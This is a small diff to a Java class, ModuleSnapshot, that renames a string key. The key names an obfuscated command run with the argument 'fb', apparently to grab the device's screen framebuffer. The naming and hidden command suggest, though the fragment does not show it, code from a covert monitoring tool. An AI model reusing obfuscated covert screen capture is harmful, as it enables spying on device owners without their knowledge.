@@ -353,7 +353,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 				Check.log(TAG + " (getRawBitmap): calling frame generator");
 			}
 
-			final Process localProcess = Runtime.getRuntime().exec(new String[] { Messages.getString("a.0"), "fb" });
+			final Process localProcess = Runtime.getRuntime().exec(new String[] { Messages.getString("a_0"), "fb" });
 			localProcess.waitFor();
 
 			if (Cfg.DEBUG) {
